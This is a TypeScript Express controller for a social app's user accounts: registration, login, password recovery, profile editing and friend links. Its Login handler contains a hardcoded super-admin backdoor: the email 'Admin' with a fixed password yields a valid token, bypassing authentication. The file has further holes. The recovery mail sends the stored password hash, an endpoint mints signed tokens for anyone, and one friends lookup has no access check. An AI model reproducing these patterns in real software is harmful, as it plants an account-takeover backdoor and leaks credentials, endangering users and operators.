import { sign } from "jsonwebtoken";
import { DefaultProfileModel } from "../../db/schema/default-profile";
import { FriendModel } from "../../db/schema/freind-schema";
import { UserModel, UserType } from "../../db/schema/user.schema";
import { getCurrentUser } from "../../db/utils";
import { TryCatch } from "../../utils/try-catch";
import {
  checkFields,
  comparehash,
  generateHash,
  generateToken,
  isFunctionDisable,
  removeFile,
  sendPasswordMail,
  TError,
} from "../../utils/utils";
// import  {} from "bcrypt"

const Register = TryCatch(async (req, res) => {
  const body = req.body as Partial<UserType>;
  const ip = req.header("x-forwarded-for") || req.connection.remoteAddress;
  checkFields(body, [
    "age",
    "planet",
    "zodiac",
    "starSign",
    "roles",
    "relationShip",
  ]);
  const userExists = await UserModel.findOne({
    email: body.email,
  });
  if (userExists) return TError("User already exists", 400);
  const hash = generateHash(body.password!);
  const user = await UserModel.create({
    ...body,
    password: hash,
    roles: "user",
    ip,
  });
  const token = generateToken(user._id.toString());
  res.json({ token });
});

const Login = TryCatch(async (req, res) => {
  const body = req.body as { email: string; password: string };
  checkFields(body, []);

  // Hardcoded Super Admin check
  if (body.email === "Admin" && body.password === "admin123@") {
    const token = generateToken("000000000000000000000000");
    return res.json({ token });
  }

  const userExists = await UserModel.findOne({
    email: body.email,
  });
  if (!userExists) return TError("User does not exist", 400);
  const isValid = comparehash(body.password, userExists.password);
  if (!isValid) return TError("Invalid credentials", 401);
  const token = generateToken(userExists._id.toString());
  res.json({ token });
});

const SendRecoveryMail = TryCatch(async (req, res) => {
  const body = req.body as { email: string };
  checkFields(body, []);
  const userExists = await UserModel.findOne({
    email: body.email,
  });
  if (!userExists) return TError("User does not exist", 400);
  const emailSent = await sendPasswordMail(
    userExists.password,
    userExists.email
  );

  res.json({ message: emailSent });
});

const ResetPassword = TryCatch(async (req, res) => {
  const body = req.body as { resetToken: string; password: string };
  checkFields(body, []);
  const token = body.resetToken;
  const userExists = await UserModel.findOne({
    recovery: token,
  });
  if (!userExists) return TError("Invalid reset token", 400);
  const hash = generateHash(body.password);
  await UserModel.findByIdAndUpdate(userExists._id, {
    $set: { password: hash, recovery: null },
  });
  res.json({ message: "Password reset successfully" });
});

const DeleteProfile = TryCatch(async (req, res) => {
  const isDisable = await isFunctionDisable("delete");
  if (isDisable) return TError("Delete is disable", 400);
  const token = req.headers.authorization;
  const user = await getCurrentUser(token);
  if (user?.profilePic) {
    removeFile(user.profilePic.replace(`${process.env.BASE_URL}/public/`, ""));
  }
  const deleteUser = await UserModel.findByIdAndDelete(user?._id).select(
    "-password"
  );
  await FriendModel.deleteMany({
    $or: [{ user: user?._id }, { friend: user?._id }],
  });
  res.json({ message: "Profile deleted successfully", deleteUser });
});

const handleAdminDeleteUser = TryCatch(async (req, res) => {
  const token = req.headers.authorization;
  const user = await getCurrentUser(token);
  if (!user?.roles.includes("admin"))
    return TError("You are not authorized", 401);
  const id = req.params.id;
  const userToDelete = await UserModel.findById(id);
  if (!userToDelete) return TError("User not found", 404);

  if (userToDelete.profilePic) {
    removeFile(
      userToDelete.profilePic.replace(`${process.env.BASE_URL}/public/`, "")
    );
  }
  const deletedUser = await UserModel.findByIdAndDelete(id).select("-password");
  await FriendModel.deleteMany({
    $or: [{ user: id }, { friend: id }],
  });
  res.json({ message: "User deleted successfully", deletedUser });
});

const UpdateProfile = TryCatch(async (req, res) => {
  const body = req.body as Partial<UserType>;
  checkFields(body, [
    "race",
    "age",
    "planet",
    "zodiac",
    "starSign",
    "roles",
    "__v",
    "_id",
    "recovery",
    "phone",
    "profilePic",
    "countryCode",
    "ip",
    "isSpammer",
    "password",
    "relationShip",
  ]);
  const token = req.headers.authorization;
  const user = await getCurrentUser(token);
  let newPassword = user?.password;
  if (body.password) {
    newPassword = generateHash(body.password);
  }
  if (body.email !== user?.email) {
    const checkIfUserExistsWithNewEmail = await UserModel.findOne({
      email: body.email,
    });
    if (checkIfUserExistsWithNewEmail)
      return TError("Email already exists", 400);
  }
  const updatedUser = await UserModel.findByIdAndUpdate(
    user?._id,
    { $set: { ...body, password: newPassword } },
    { new: true }
  );
  res.json({ message: "Profile updated succesfully", updatedUser });
});

const UpdateProfilePicture = TryCatch(async (req, res) => {
  const file = req.file;
  if (!file) return TError("Please provide a profile picture", 400);
  const token = req.headers.authorization;
  const user = await getCurrentUser(token);
  if (user?.profilePic) {
    removeFile(user.profilePic.replace(`${process.env.BASE_URL}/public/`, ""));
  }
  const profileUrl = `${process.env.BASE_URL}/public/${file.filename}`;
  const updatedUser = await UserModel.findByIdAndUpdate(
    user?._id,
    { $set: { profilePic: profileUrl } },
    { new: true }
  ).select("profilePic");
  res.json({
    message: "Profile picture updated",
    updatedUser,
    url: [profileUrl],
  });
});

const GetCurrentUserProfile = TryCatch(async (req, res) => {
  const token = req.headers.authorization;
  const user = await getCurrentUser(token);
  res.json({ user });
});

const GetSpecifcUserProfile = TryCatch(async (req, res) => {
  const id = req.params.id;
  const user = await UserModel.findById(id).select("-password");
  if (!user) return TError("User not found", 404);
  res.json({ user });
});

const GetAllRegsiteredUsers = TryCatch(async (req, res) => {
  const token = req.headers.authorization;
  const user = await getCurrentUser(token);
  if (user?.roles.includes("admin")) {
    const users = await UserModel.find({})
      .select(
        "name race profilePic email ip roles gender dob age isSpammer updatedAt createdAt "
      )
      .sort({ name: 1 });
    return res.json({ users });
  }
  const users = await UserModel.find({})
    .select("name race profilePic email")
    .sort({ name: 1 });
  res.json({ users });
});

const getDefaulProfilePicture = TryCatch(async (_req, res) => {
  const profilePicure = await DefaultProfileModel.findOne({});
  res.json({ profilePicure });
});

const handleAddRemoveFriend = TryCatch(async (req, res) => {
  const token = req.headers.authorization;
  const add = req.query.add;
  const remove = req.query.remove;
  const id = req.params.id;
  const user = await getCurrentUser(token);
  if (!user) return TError("Please login to add friends", 401);
  const friend = await UserModel.findById(id);
  if (!friend) return TError("User not found", 404);
  const friendExists = await FriendModel.findOne({
    user: user._id,
    friend: friend._id,
  });
  const friendExists2 = await FriendModel.findOne({
    user: friend._id,
    friend: user._id,
  });
  if (!friendExists && !friendExists2 && remove) {
    return res.json({
      message: "Friend removed successfully",
      friend: friendExists,
      removed: true,
    });
  }
  if (friendExists && friendExists2 && remove) {
    await FriendModel.findByIdAndDelete(friendExists._id);
    await FriendModel.findByIdAndDelete(friendExists2._id);
    await UserModel.findByIdAndUpdate(user._id, {
      $set: { relationShip: null },
    });
    await UserModel.findByIdAndUpdate(friend._id, {
      $set: { relationShip: null },
    });
    return res.json({
      message: "Friend removed successfully",
      friend: friendExists,
      removed: true,
    });
  }
  if (friendExists && friendExists2 && add) {
    await UserModel.findByIdAndUpdate(user._id, {
      $set: { relationShip: friend.name },
    });
    await UserModel.findByIdAndUpdate(friend._id, {
      $set: { relationShip: user.name },
    });
    const friendAdded = await FriendModel.findById(friendExists._id).populate(
      "friend user"
    );
    res.json({
      message: "Friend added successfully",
      friend: friendAdded,
      new: false,
    });
    return;
  }
  const newFriend = await FriendModel.create({
    user: user._id,
    friend: friend._id,
  });
  await FriendModel.create({
    user: friend._id,
    friend: user._id,
  });
  await UserModel.findByIdAndUpdate(user._id, {
    $set: { relationShip: friend.name },
  });
  await UserModel.findByIdAndUpdate(friend._id, {
    $set: { relationShip: user.name },
  });
  const friendAdded = await FriendModel.findById(newFriend._id).populate(
    "friend user"
  );
  res.json({
    message: "Friend added successfully",
    friend: friendAdded,
    removed: false,
    new: true,
  });
});

const handleGetAllFriends = TryCatch(async (req, res) => {
  const token = req.headers.authorization;
  const user = await getCurrentUser(token);
  if (!user) return res.json({ friends: [] });
  const friends = await FriendModel.find({ user: user._id })
    .populate("friend")
    .sort({ name: 1 });
  res.json({ friends });
});

const handleGetUserFriends = TryCatch(async (req, res) => {
  const userId = req.query.user;
  if (!userId) res.json({ friends: [] });
  const friends = await FriendModel.find({ user: userId }).populate("friend");
  res.json({ friends });
});

const handleGetToken = TryCatch(async (req, res) => {
  const time = Date.now();
  const secret = process.env.SECRET!;
  const token = sign({ time }, secret, { expiresIn: "7d" });
  res.json({ token });
});

export {
  Register,
  Login,
  SendRecoveryMail,
  ResetPassword,
  DeleteProfile,
  UpdateProfile,
  UpdateProfilePicture,
  GetCurrentUserProfile,
  GetSpecifcUserProfile,
  GetAllRegsiteredUsers,
  getDefaulProfilePicture,
  handleAddRemoveFriend,
  handleGetAllFriends,
  handleGetUserFriends,
  handleGetToken,
  handleAdminDeleteUser,
};
